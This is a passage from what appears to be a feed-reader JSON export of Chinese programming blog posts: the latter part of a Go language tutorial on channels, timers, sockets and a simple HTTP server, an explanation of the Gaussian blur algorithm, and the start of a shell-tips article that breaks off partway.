channel &lt;- &quot;hello&quot; }()\n\n    msg := &lt;- channel\n    fmt.Println(msg)\n}</pre>\n<p><strong>指定channel的buffer</strong></p>\n<p>指定buffer的大小很简单，看下面的程序：</p>\n<pre>package main\nimport &quot;fmt&quot;\n\nfunc main() {\n    channel := make(chan string, 2)\n\n    go func() {\n        channel &lt;- &quot;hello&quot;\n        channel &lt;- &quot;World&quot;\n    }()\n\n    msg1 := &lt;-channel\n    msg2 := &lt;-channel\n    fmt.Println(msg1, msg2)\n}</pre>\n<p><strong>Channel的阻塞</strong></p>\n<p>注意，channel默认上是阻塞的，也就是说，如果Channel满了，就阻塞写，如果Channel空了，就阻塞读。于是，我们就可以使用这种特性来同步我们的发送和接收端。</p>\n<p>下面这个例程说明了这一点，代码有点乱，不过我觉得不难理解。</p>\n<pre>package main\n\nimport &quot;fmt&quot;\nimport &quot;time&quot;\n\nfunc main() {\n\n    channel := make(chan string) //注意: buffer为1\n\n    go func() {\n        channel &lt;- &quot;hello&quot;\n        fmt.Println(&quot;write \\&quot;hello\\&quot; done!&quot;)\n\n        channel &lt;- &quot;World&quot; //Reader在Sleep，这里在阻塞\n        fmt.Println(&quot;write \\&quot;World\\&quot; done!&quot;)\n\n        fmt.Println(&quot;Write go sleep...&quot;)\n        time.Sleep(3*time.Second)\n        channel &lt;- &quot;channel&quot;\n        fmt.Println(&quot;write \\&quot;channel\\&quot; done!&quot;)\n    }()\n\n    time.Sleep(2*time.Second)\n    fmt.Println(&quot;Reader Wake up...&quot;)\n\n    msg := &lt;-channel\n    fmt.Println(&quot;Reader: &quot;, msg)\n\n    msg = &lt;-channel\n    fmt.Println(&quot;Reader: &quot;, msg)\n\n    msg = &lt;-channel //Writer在Sleep，这里在阻塞\n    fmt.Println(&quot;Reader: &quot;, msg)\n}</pre>\n<p>上面的代码输出的结果如下：</p>\n<pre>\nReader Wake up...\nReader:  hello\nwrite &quot;hello&quot; done!\nwrite &quot;World&quot; done!\nWrite go sleep...\nReader:  World\nwrite &quot;channel&quot; done!\nReader:  channel\n</pre>\n<p><strong>Channel阻塞的这个特性还有一个好处是，可以让我们的goroutine在运行的一开始就阻塞在从某个channel领任务，这样就可以作成一个类似于线程池一样的东西。关于这个程序我就不写了。我相信你可以自己实现的。</strong></p>\n<p><strong>多个Channel的select</strong></p>\n<pre>package main\nimport &quot;time&quot;\nimport &quot;fmt&quot;\n\nfunc main() {\n    //创建两个channel - c1 c2\n    c1 := make(chan string)\n    c2 := make(chan string)\n\n    //创建两个goruntine来分别向这两个channel发送数据\n    go func() {\n        time.Sleep(time.Second * 1)\n        c1 &lt;- &quot;Hello&quot;\n    }()\n    go func() {\n        time.Sleep(time.Second * 1)\n        c2 &lt;- &quot;World&quot;\n    }()\n\n    //使用select来侦听两个channel\n    for i := 0; i &lt; 2; i++ {\n        select {\n        case msg1 := &lt;-c1:\n            fmt.Println(&quot;received&quot;, msg1)\n        case msg2 := &lt;-c2:\n            fmt.Println(&quot;received&quot;, msg2)\n        }\n    }\n}</pre>\n<p>注意：上面的select是阻塞的，所以，才搞出ugly的for i &lt;2这种东西<strong>。<br>\n</strong></p>\n<p><strong>Channel select阻塞的Timeout</strong></p>\n<p>解决上述那个for循环的问题，一般有两种方法：一种是阻塞但有timeout，一种是无阻塞。我们来看看如果给select设置上timeout的。</p>\n<pre>\n    for {\n        timeout_cnt := 0\n        select {\n        case msg1 := &lt;-c1:\n            fmt.Println(&quot;msg1 received&quot;, msg1)\n        case msg2 := &lt;-c2:\n            fmt.Println(&quot;msg2 received&quot;, msg2)\n        case  &lt;-time.After(time.Second * 30)：\n            fmt.Println(&quot;Time Out&quot;)\n            timout_cnt++\n        }\n        if time_cnt &gt; 3 {\n            break\n        }\n    }\n</pre>\n<p>上面代码中高亮的代码主要是用来让select返回的，注意 case中的time.After事件。</p>\n<p><strong>Channel的无阻塞</strong></p>\n<p>好，我们再来看看无阻塞的channel，其实也很简单，就是在select中加入default，如下所示：</p>\n<pre>\n    for {\n        select {\n        case msg1 := &lt;-c1:\n            fmt.Println(&quot;received&quot;, msg1)\n        case msg2 := &lt;-c2:\n            fmt.Println(&quot;received&quot;, msg2)\n        default: //default会导致无阻塞\n            fmt.Println(&quot;nothing received!&quot;)\n            time.Sleep(time.Second)\n        }\n    }\n</pre>\n<p><strong>Channel的关闭</strong></p>\n<p>关闭Channel可以通知对方内容发送完了，不用再等了。参看下面的例程：</p>\n<pre>package main\n\nimport &quot;fmt&quot;\nimport &quot;time&quot;\nimport &quot;math/rand&quot;\n\nfunc main() {\n\n    channel := make(chan string)\n    rand.Seed(time.Now().Unix())\n\n    //向channel发送随机个数的message\n    go func () {\n        cnt := rand.Intn(10)\n        fmt.Println(&quot;message cnt :&quot;, cnt)\n        for i:=0; i&lt;cnt; i++{\n            channel &lt;- fmt.Sprintf(&quot;message-%2d&quot;, i)\n        }\n        close(channel) //关闭Channel\n    }()\n\n    var more bool = true\n    var msg string\n    for more {\n        select{\n        //channel会返回两个值，一个是内容，一个是还有没有内容\n        case msg, more = &lt;- channel:\n            if more {\n                fmt.Println(msg)\n            }else{\n                fmt.Println(&quot;channel closed!&quot;)\n            }\n        }\n    }\n}</pre>\n<h4>定时器</h4>\n<p>Go语言中可以使用time.NewTimer或time.NewTicker来设置一个定时器，这个定时器会绑定在你的当前channel中，通过channel的阻塞通知机器来通知你的程序。</p>\n<p>下面是一个timer的示例。</p>\n<pre>package main\n\nimport &quot;time&quot;\nimport &quot;fmt&quot;\n\nfunc main() {\n    timer := time.NewTimer(2*time.Second)\n\n    &lt;- timer.C\n    fmt.Println(&quot;timer expired!&quot;)\n}</pre>\n<p>上面的例程看起来像一个Sleep，是的，不过Timer是可以Stop的。你需要注意Timer只通知一次。如果你要像C中的Timer能持续通知的话，你需要使用Ticker。下面是Ticker的例程：</p>\n<pre>package main\n\nimport &quot;time&quot;\nimport &quot;fmt&quot;\n\nfunc main() {\n    ticker := time.NewTicker(time.Second)\n\n    for t := range ticker.C {\n        fmt.Println(&quot;Tick at&quot;, t)\n    }\n}</pre>\n<p>上面的这个ticker会让你程序进入死循环，我们应该放其放在一个goroutine中。下面这个程序结合了timer和ticker</p>\n<pre>package main\n\nimport &quot;time&quot;\nimport &quot;fmt&quot;\n\nfunc main() {\n\n    ticker := time.NewTicker(time.Second)\n\n    go func () {\n        for t := range ticker.C {\n            fmt.Println(t)\n        }\n    }()\n\n    //设置一个timer，10钞后停掉ticker\n    timer := time.NewTimer(10*time.Second)\n    &lt;- timer.C\n\n    ticker.Stop()\n    fmt.Println(&quot;timer expired!&quot;)\n}</pre>\n<h4>Socket编程</h4>\n<p>下面是我尝试的一个Echo Server的Socket代码，感觉还是挺简单的。</p>\n<pre>\npackage main\n\nimport (\n    &quot;net&quot;\n    &quot;fmt&quot;\n    &quot;io&quot;\n)\n\nconst RECV_BUF_LEN = 1024\n\nfunc main() {\n    listener, err := net.Listen(&quot;tcp&quot;, &quot;0.0.0.0:6666&quot;)//侦听在6666端口\n    if err != nil {\n        panic(&quot;error listening:&quot;+err.Error())\n    }\n    fmt.Println(&quot;Starting the server&quot;)\n\n    for {\n        conn, err := listener.Accept() //接受连接\n        if err != nil {\n            panic(&quot;Error accept:&quot;+err.Error())\n        }\n        fmt.Println(&quot;Accepted the Connection :&quot;, conn.RemoteAddr())\n        go EchoServer(conn)\n    }\n}\n\nfunc EchoServer(conn net.Conn) {\n    buf := make([]byte, RECV_BUF_LEN)\n    defer conn.Close()\n\n    for {\n        n, err := conn.Read(buf);\n        switch err {\n            case nil:\n                conn.Write( buf[0:n] )\n            case io.EOF:\n                fmt.Printf(&quot;Warning: End of data: %s \\n&quot;, err);\n                return\n            default:\n                fmt.Printf(&quot;Error: Reading data : %s \\n&quot;, err);\n                return\n        }\n     }\n}\n</pre>\n<pre>\npackage main\n\nimport (\n    &quot;fmt&quot;\n    &quot;time&quot;\n    &quot;net&quot;\n)\n\nconst RECV_BUF_LEN = 1024\n\nfunc main() {\n    conn,err := net.Dial(&quot;tcp&quot;, &quot;127.0.0.1:6666&quot;)\n    if err != nil {\n        panic(err.Error())\n    }\n    defer conn.Close()\n\n    buf := make([]byte, RECV_BUF_LEN)\n\n    for i := 0; i &lt; 5; i++ {\n        //准备要发送的字符串\n        msg := fmt.Sprintf(&quot;Hello World, %03d&quot;, i)\n        n, err := conn.Write([]byte(msg))\n        if err != nil {\n            println(&quot;Write Buffer Error:&quot;, err.Error())\n            break\n        }\n        fmt.Println(msg)\n\n        //从服务器端收字符串\n        n, err = conn.Read(buf)\n        if err !=nil {\n            println(&quot;Read Buffer Error:&quot;, err.Error())\n            break\n        }\n        fmt.Println(string(buf[0:n]))\n\n        //等一秒钟\n        time.Sleep(time.Second)\n    }\n}\n</pre>\n<h4>系统调用</h4>\n<p>Go语言那么C，所以，一定会有一些系统调用。Go语言主要是通过两个包完成的。一个是<a href=\"http://golang.org/pkg/os/\">os包</a>，一个是<a href=\"http://golang.org/pkg/syscall/\">syscall包</a>。（注意，链接被墙）</p>\n<p>这两个包里提供都是Unix-Like的系统调用，</p>\n<ul>\n<li>syscall里提供了什么Chroot/Chmod/Chmod/Chdir…，Getenv/Getgid/Getpid/Getgroups/Getpid/Getppid…，还有很多如Inotify/Ptrace/Epoll/Socket/…的系统调用。</li>\n</ul>\n<ul>\n<li>os包里提供的东西不多，主要是一个跨平台的调用。它有三个子包，Exec（运行别的命令）, Signal（捕捉信号）和User（通过uid查name之类的）</li>\n</ul>\n<p>syscall包的东西我不举例了，大家可以看看《Unix高级环境编程》一书。</p>\n<p>os里的取几个例：</p>\n<p><strong>环境变量</strong></p>\n<pre>package main\n\nimport &quot;os&quot;\nimport &quot;strings&quot;\n\n\nfunc main() {\n    os.Setenv(&quot;WEB&quot;, &quot;http://coolshell.cn&quot;) //设置环境变量\n    println(os.Getenv(&quot;WEB&quot;)) //读出来\n\n    for _, env := range os.Environ() { //穷举环境变量\n        e := strings.Split(env, &quot;=&quot;)\n        println(e[0], &quot;=&quot;, e[1])\n    }\n}\n</pre>\n<h4>执行命令行</h4>\n<p>下面是一个比较简单的示例</p>\n<pre>\npackage main\nimport &quot;os/exec&quot;\nimport &quot;fmt&quot;\nfunc main() {\n    cmd := exec.Command(&quot;ping&quot;, &quot;127.0.0.1&quot;)\n    out, err := cmd.Output()\n    if err!=nil {\n        println(&quot;Command Error!&quot;, err.Error())\n        return\n    }\n    fmt.Println(string(out))\n}</pre>\n<p>正规一点的用来处理标准输入和输出的示例如下：</p>\n<pre>package main\n\nimport (\n\t&quot;strings&quot;\n\t&quot;bytes&quot;\n\t&quot;fmt&quot;\n\t&quot;log&quot;\n\t&quot;os/exec&quot;\n)\n\nfunc main() {\n\tcmd := exec.Command(&quot;tr&quot;, &quot;a-z&quot;, &quot;A-Z&quot;)\n\tcmd.Stdin = strings.NewReader(&quot;some input&quot;)\n\tvar out bytes.Buffer\n\tcmd.Stdout = &amp;out\n\terr := cmd.Run()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tfmt.Printf(&quot;in all caps: %q\\n&quot;, out.String())\n}</pre>\n<h4>命令行参数</h4>\n<p>Go语言中处理命令行参数很简单：(使用os的Args就可以了)</p>\n<pre>func main() {\n    args := os.Args\n    fmt.Println(args) //带执行文件的\n    fmt.Println(args[1:]) //不带执行文件的\n}</pre>\n<p>在Windows下，如果运行结果如下：</p>\n<p><code>C:\\Projects\\Go&gt;go run args.go aaa bbb ccc ddd<br>\n[C:\\Users\\haoel\\AppData\\Local\\Temp\\go-build742679827\\command-line-arguments\\_<br>\nobj\\a.out.exe aaa bbb ccc ddd]<br>\n[aaa bbb ccc ddd]</code></p>\n<p>那么，如果我们要搞出一些像 mysql -uRoot -hLocalhost -pPwd 或是像 cc -O3 -Wall -o a a.c 这样的命令行参数我们怎么办？Go提供了一个package叫flag可以容易地做到这一点</p>\n<pre>\npackage main\nimport &quot;flag&quot;\nimport &quot;fmt&quot;\n\nfunc main() {\n\n    //第一个参数是“参数名”，第二个是“默认值”，第三个是“说明”。返回的是指针\n    host := flag.String(&quot;host&quot;, &quot;coolshell.cn&quot;, &quot;a host name &quot;)\n    port := flag.Int(&quot;port&quot;, 80, &quot;a port number&quot;)\n    debug := flag.Bool(&quot;d&quot;, false, &quot;enable/disable debug mode&quot;)\n\n    //正式开始Parse命令行参数\n    flag.Parse()\n\n    fmt.Println(&quot;host:&quot;, *host)\n    fmt.Println(&quot;port:&quot;, *port)\n    fmt.Println(&quot;debug:&quot;, *debug)\n}</pre>\n<p>执行起来会是这个样子：</p>\n<pre>\n#如果没有指定参数名，则使用默认值\n$ go run flagtest.go\nhost: coolshell.cn\nport: 80\ndebug: false\n\n#指定了参数名后的情况\n$ go run flagtest.go -host=localhost -port=22 -d\nhost: localhost\nport: 22\ndebug: true\n\n#用法出错了（如：使用了不支持的参数，参数没有=）\n$ go build flagtest.go\n$ ./flagtest -debug -host localhost -port=22\nflag provided but not defined: -debug\nUsage of flagtest:\n  -d=false: enable/disable debug mode\n  -host=&quot;coolshell.cn&quot;: a host name\n  -port=80: a port number\nexit status 2\n</pre>\n<p>感觉还是挺不错的吧。</p>\n<h4>一个简单的HTTP Server</h4>\n<p>代码胜过千言万语。呵呵。这个小程序让我又找回以前用C写CGI的时光了。（Go的官方文档是《<strong><a href=\"http://golang.org/doc/articles/wiki/\">Writing Web Applications</a></strong>》）</p>\n<pre>package main\n\nimport (\n    &quot;fmt&quot;\n    &quot;net/http&quot;\n    &quot;io/ioutil&quot;\n    &quot;path/filepath&quot;\n)\n\nconst http_root = &quot;/home/haoel/coolshell.cn/&quot;\n\nfunc main() {\n    http.HandleFunc(&quot;/&quot;, rootHandler)\n    http.HandleFunc(&quot;/view/&quot;, viewHandler)\n    http.HandleFunc(&quot;/html/&quot;, htmlHandler)\n\n    http.ListenAndServe(&quot;:8080&quot;, nil)\n}\n\n//读取一些HTTP的头\nfunc rootHandler(w http.ResponseWriter, r *http.Request) {\n    fmt.Fprintf(w, &quot;rootHandler: %s\\n&quot;, r.URL.Path)\n    fmt.Fprintf(w, &quot;URL: %s\\n&quot;, r.URL)\n    fmt.Fprintf(w, &quot;Method: %s\\n&quot;, r.Method)\n    fmt.Fprintf(w, &quot;RequestURI: %s\\n&quot;, r.RequestURI )\n    fmt.Fprintf(w, &quot;Proto: %s\\n&quot;, r.Proto)\n    fmt.Fprintf(w, &quot;HOST: %s\\n&quot;, r.Host) \n}\n\n//特别的URL处理\nfunc viewHandler(w http.ResponseWriter, r *http.Request) {\n    fmt.Fprintf(w, &quot;viewHandler: %s&quot;, r.URL.Path)\n}\n\n//一个静态网页的服务示例。（在http_root的html目录下）\nfunc htmlHandler(w http.ResponseWriter, r *http.Request) {\n    fmt.Printf(&quot;htmlHandler: %s\\n&quot;, r.URL.Path)\n    \n    filename := http_root + r.URL.Path\n    fileext := filepath.Ext(filename)\n\n    content, err := ioutil.ReadFile(filename)\n    if err != nil {\n        fmt.Printf(&quot;   404 Not Found!\\n&quot;)\n        w.WriteHeader(http.StatusNotFound)\n        return\n    }\n    \n    var contype string\n    switch fileext {\n        case &quot;.html&quot;, &quot;htm&quot;:\n            contype = &quot;text/html&quot;\n        case &quot;.css&quot;:\n            contype = &quot;text/css&quot;\n        case &quot;.js&quot;:\n            contype = &quot;application/javascript&quot;\n        case &quot;.png&quot;:\n            contype = &quot;image/png&quot;\n        case &quot;.jpg&quot;, &quot;.jpeg&quot;:\n            contype = &quot;image/jpeg&quot;\n        case &quot;.gif&quot;:\n            contype = &quot;image/gif&quot;\n        default: \n            contype = &quot;text/plain&quot;\n    }\n    fmt.Printf(&quot;ext %s, ct = %s\\n&quot;, fileext, contype)\n    \n    w.Header().Set(&quot;Content-Type&quot;, contype)\n    fmt.Fprintf(w, &quot;%s&quot;, content)\n    \n}</pre>\n<p>Go的功能库有很多，大家自己慢慢看吧。<strong>我再吐个槽——Go的文档真不好读。例子太少了</strong>。</p>\n<p>先说这么多吧。这是我周末两天学Go语言学到的东西，写得太仓促了，而且还有一些东西理解不到位，还大家请指正！</p>\n<p>（全文完）\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:14px;margin-bottom:50px\">——=== <b>访问 <a href=\"http://coolshell.cn/404/\">酷壳404页面</a> 以支持公益事业</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li>2012年11月06日 -- <a href=\"http://coolshell.cn/articles/8460.html\">Go 语言简介（上）— 语法</a></li><li>2012年07月05日 -- <a href=\"http://coolshell.cn/articles/7771.html\">少即是极多</a></li><li>2010年09月28日 -- <a href=\"http://coolshell.cn/articles/3013.html\">一些非常有意思的杂项资源</a></li><li>2009年11月12日 -- <a href=\"http://coolshell.cn/articles/1761.html\">Go语言源码的一个改动</a></li><li>2009年11月13日 -- <a href=\"http://coolshell.cn/articles/1781.html\">Go语言更名Issue 9？</a></li><li>2010年10月12日 -- <a href=\"http://coolshell.cn/articles/3156.html\">Go语言的”Issue 9″ Closed!</a></li><li>2009年11月16日 -- <a href=\"http://coolshell.cn/articles/1788.html\">程序语言性能比拼</a></li><li>2009年11月11日 -- <a href=\"http://coolshell.cn/articles/1751.html\">Go 语言：Google 的新编程语言</a></li></ul><div><a rel=\"nofollow\" href=\"http://www.zemanta.com/?wp-related-posts\">Zemanta</a></div></div></div></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1354029796014",
    "timestampUsec" : "1354029796014914",
    "id" : "tag:google.com,2005:reader/item/a431ceaeffa9ea2e",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "高斯模糊的算法",
    "published" : 1352885942,
    "updated" : 1352885942,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2012/11/gaussian_blur.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>通常，图像处理软件会提供\"模糊\"（blur）滤镜，使图片产生模糊的效果。</p><p><img src=\"http://image.beekka.com/blog/201211/bg2012111401.jpg\"></p>\n\n<p>\"模糊\"的算法有很多种，其中有一种叫做<a href=\"http://en.wikipedia.org/wiki/Gaussian_blur\">\"高斯模糊\"</a>（Gaussian Blur）。它将<a href=\"http://zh.wikipedia.org/wiki/%E6%AD%A3%E6%80%81%E5%88%86%E5%B8%83\">正态分布</a>（又名\"高斯分布\"）用于图像处理。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201211/bg2012111402.png\"></p>\n\n<p>本文介绍\"高斯模糊\"的算法，你会看到这是一个非常简单易懂的算法。本质上，它是一种<a href=\"http://en.wikipedia.org/wiki/Smoothing\">数据平滑技术</a>（data smoothing），适用于多个场合，图像处理恰好提供了一个直观的应用实例。</p>\n\n<p><strong>一、高斯模糊的原理</strong></p>\n\n<p>所谓\"模糊\"，可以理解成每一个像素都取周边像素的平均值。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201211/bg2012111403.png\"></p>\n\n<p>上图中，2是中间点，周边点都是1。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201211/bg2012111404.png\"></p>\n\n<p>\"中间点\"取\"周围点\"的平均值，就会变成1。在数值上，这是一种\"平滑化\"。在图形上，就相当于产生\"模糊\"效果，\"中间点\"失去细节。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201211/bg2012111405.jpg\"></p>\n\n<p>显然，计算平均值时，取值范围越大，\"模糊效果\"越强烈。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201211/bg2012111406.jpg\"></p>\n\n<p>上面分别是原图、模糊半径3像素、模糊半径10像素的效果。模糊半径越大，图像就越模糊。从数值角度看，就是数值越平滑。</p>\n\n<p>接下来的问题就是，既然每个点都要取周边像素的平均值，那么应该如何分配权重呢？</p>\n\n<p>如果使用简单平均，显然不是很合理，因为图像都是连续的，越靠近的点关系越密切，越远离的点关系越疏远。因此，加权平均更合理，距离越近的点权重越大，距离越远的点权重越小。</p>\n\n<p><strong>二、正态分布的权重</strong></p>\n\n<p>正态分布显然是一种可取的权重分配模式。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201211/bg2012111407.png\"></p>\n\n<p>在图形上，正态分布是一种钟形曲线，越接近中心，取值越大，越远离中心，取值越小。</p>\n\n<p>计算平均值的时候，我们只需要将\"中心点\"作为原点，其他点按照其在正态曲线上的位置，分配权重，就可以得到一个加权平均值。</p>\n\n<p><strong>三、高斯函数</strong></p>\n\n<p>上面的正态分布是一维的，图像都是二维的，所以我们需要二维的正态分布。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201211/bg2012110708.png\"></p>\n\n<p>正态分布的密度函数叫做<a href=\"http://en.wikipedia.org/wiki/Gaussian_function\">\"高斯函数\"</a>（Gaussian function）。它的一维形式是：</p>\n\n<p><img src=\"http://chart.googleapis.com/chart?cht=tx&amp;chl=f(x)%3D%5Cfrac%7B1%7D%7B%5Csigma%5Csqrt%7B2%5Cpi%20%7D%20%7D%7De%5E%7B-(x-%5Cmu%20)%5E%7B2%7D%2F2%5Csigma%5E%7B2%7D%7D&amp;chs=120\" style=\"border:none\"></p>\n\n<p>其中，μ是x的均值，σ是x的方差。因为计算平均值的时候，中心点就是原点，所以μ等于0。</p>\n\n<p><img src=\"http://chart.googleapis.com/chart?cht=tx&amp;chl=f(x)%3D%5Cfrac%7B1%7D%7B%5Csigma%5Csqrt%7B2%5Cpi%20%7D%20%7D%7De%5E%7B-x%5E%7B2%7D%2F2%5Csigma%5E%7B2%7D%7D&amp;chs=120\" style=\"border:none\"></p>\n\n<p>根据一维高斯函数，可以推导得到二维高斯函数：</p>\n\n<p><img src=\"http://chart.googleapis.com/chart?cht=tx&amp;chl=G(x%2Cy)%3D%5Cfrac%7B1%7D%7B2%5Cpi%20%5Csigma%20%5E%7B2%7D%7De%5E%7B-(x%5E2%2By%5E2)%2F2%5Csigma%5E2%7D&amp;chs=80\" style=\"border:none\"></p>\n\n<p>有了这个函数 ，就可以计算每个点的权重了。</p>\n\n<p><strong>四、权重矩阵</strong></p>\n\n<p>假定中心点的坐标是（0,0），那么距离它最近的8个点的坐标如下：</p>\n\n<p><img src=\"http://image.beekka.com/blog/201211/bg2012111410.png\"></p>\n\n<p>更远的点以此类推。</p>\n\n<p>为了计算权重矩阵，需要设定σ的值。假定σ=1.5，则模糊半径为1的权重矩阵如下：</p>\n\n<p><img src=\"http://image.beekka.com/blog/201211/bg2012111411.png\"></p>\n\n<p>这9个点的权重总和等于0.4787147，如果只计算这9个点的加权平均，还必须让它们的权重之和等于1，因此上面9个值还要分别除以0.4787147，得到最终的权重矩阵。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201211/bg2012111412.png\"></p>\n\n<p><strong>五、计算高斯模糊</strong></p>\n\n<p>有了权重矩阵，就可以计算高斯模糊的值了。</p>\n\n<p>假设现有9个像素点，灰度值（0-255）如下：</p>\n\n<p><img src=\"http://image.beekka.com/blog/201211/bg2012111413.png\"></p>\n\n<p>每个点乘以自己的权重值：</p>\n\n<p><img src=\"http://image.beekka.com/blog/201211/bg2012111414.png\"></p>\n\n<p>得到</p>\n\n<p><img src=\"http://image.beekka.com/blog/201211/bg2012111416.png\"></p>\n\n<p>将这9个值加起来，就是中心点的高斯模糊的值。</p>\n\n<p>对所有点重复这个过程，就得到了高斯模糊后的图像。如果原图是彩色图片，可以对RGB三个通道分别做高斯模糊。</p>\n\n<p><strong>六、边界点的处理</strong></p>\n\n<p>如果一个点处于边界，周边没有足够的点，怎么办？</p>\n\n<p>一个变通方法，就是把已有的点拷贝到另一面的对应位置，模拟出完整的矩阵。</p>\n\n<p><strong>七、参考文献</strong></p>\n\n<p>* <a href=\"http://www.swageroo.com/wordpress/how-to-program-a-gaussian-blur-without-using-3rd-party-libraries/\">How to program a Gaussian Blur without using 3rd party libraries</a></p>\n\n<p>（完）</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2012/11/gaussian_blur.html\">http://www.ruanyifeng.com/blog/2012/11/gaussian_blur.html</a></li>\n<li>最后修改时间：2012年12月12日 11:05</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1353901946586",
    "timestampUsec" : "1353901946586632",
    "id" : "tag:google.com,2005:reader/item/93c4fe506156a5bf",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Unix/Linux", "杂项资源", "编程工具", "Bash", "Linux", "Shell", "Unix" ],
    "title" : "你可能不知道的Shell",
    "published" : 1353629964,
    "updated" : 1353629964,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/8619.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><span style=\"color:#ff0000\"><strong>（感谢<a href=\"http://404null.com\">404null</a>投稿）</strong></span></p>\n<p>Shell也叫做命令行界面，它是*nix操作系统下用户和计算机的交互界面。Shell这个词是指操作系统中提供访问内核服务的程序。</p>\n<p>这篇文章向大家介绍Shell一些非广为人知、但却实用有趣的知识，权当品尝shell主食后的甜点吧。</p>\n<h4>科普</h4>\n<p>先科普几个你可能不知道的事实：</p>\n<ul>\n<li>Shell几乎是和Unix操作系统一起诞生，第一个Unix Shell是肯·汤普逊（Ken Thompson）以Multics上的Shell为模范在1971年改写而成，并命名Thompson sh。即便是后来流行的bash（shell的一种变体），它的年龄实际上比当前流行的所有的Linux kernel都大，可谓在Linux系统上是先有Shell再有Kernel。</li>\n</ul>\n<ul>\n<li>当前绝大部分*nix和MacOS操作系统里的默认的Shell都是bash，bash由Brian Fox在1987年创造，全称Bourne Again shell ( bash)。</li>\n</ul>\n<ul>\n<li>你或许听说除了bash之外，还有Bourne shell ( sh)，Korn shell ( ksh)，C shell （包括 csh and tcsh），但是你知道这个星球上一共存在着大约50多种不同的shell么？想了解他们，请参考 <a href=\"http://www.freebsd.org/ports/shells.html\">http://www.freebsd.org/ports/shells.html</a>。</li>\n</ul>\n<ul>\n<li>每个月<a href=\"http://www.tiobe.com/index.php/content/paperinfo/tpci/index.html\">tiobe</a>上都会给一个编程语言的排名，来显示各种语言的流行度。排名指数综合了全球范围内使用该语言的工程师人数、教学的课程数和第三方供应商数。截止至2012年11月份，tiobe公布的编程语言排行榜里，bash的指数是0.56%排名22位。如果算上它旗下的awk 0.21%和tcl 0.146%，大概就能排到14名。注意这里还不包括bash的同源的兄弟姐妹csh、ksh等，算上它们，shell家族有望接近前十。值得一提的是一直以来shell的排名就很稳定，不像某些“暴发户”语言，比如objective-c，这些语言的流行完全是因为当前Apple系的崛起，但这种热潮极有可能来得快去得更快。</li>\n</ul>\n<p><span></span></p>\n<ol>\n<li><img src=\"http://www.ituring.com.cn/download/01RTOwtqdvu1\" alt=\"Tiobe下全球编程语言排名1~20\"></li>\n</ol>\n<p><img src=\"http://www.ituring.com.cn/download/01RTOwwaK8UF\" alt=\"Tiobe下全球编程语言排名21~40\"></p>\n<p>全球最大的源代码仓库Github里，shell相关的项目数占到了8%，跻身前5和Java相当，可见在实战工程里，shell可谓宝刀不老。图片来源，<a href=\"https://github.com/languages\">参见这里</a></p>\n<ol>\n<li><img src=\"http://www.ituring.com.cn/download/01RTOwxOSjba\" alt=\"Github里源代码项目按编程语言排名\"></li>\n</ol>\n<h4>一些强大的命令</h4>\n<p>再分享一些可能你不知道的shell用法和脚本，简单&amp;强大！</p>\n<p><em>在阅读以下部分前，强烈建议读者打开一个shell实验，这些都不是shell教科书里的大路货哦：）</em></p>\n<ul>\n<li><code><code><strong>!$</strong><br>\n<code>!$是一个特殊的环境变量，它代表了上一个命令的最后一个字符串。如：你可能会这样：<br>\n$mkdir mydir<br>\n$mv mydir yourdir</code><br>\n$cd yourdir<br>\n可以改成：<br>\n$mkdir mydir<br>\n$mv !$ yourdir<br>\n$cd !$</code></code></li>\n</ul>\n<ul>\n<li><strong><code>sudo !!</code></strong><br>\n以root的身份执行上一条命令 